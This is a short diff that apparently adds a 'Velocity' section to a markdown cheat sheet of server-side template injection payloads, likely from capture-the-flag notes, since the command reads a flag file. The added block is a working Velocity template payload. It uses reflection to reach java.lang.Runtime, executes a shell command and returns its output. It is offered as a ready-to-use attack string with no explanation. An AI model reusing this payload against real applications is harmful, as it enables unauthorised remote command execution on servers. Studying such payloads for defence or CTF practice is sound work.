@@ -160,3 +160,16 @@ for item in "".__class__.__mro__[-1].__subclasses__():
 
 ```
 
+
+
+## Velocity
+
+### payload
+
+```
+#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('cat /tmp/flag_1s_s000e4syyy223')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+```
+
+
+
+## 
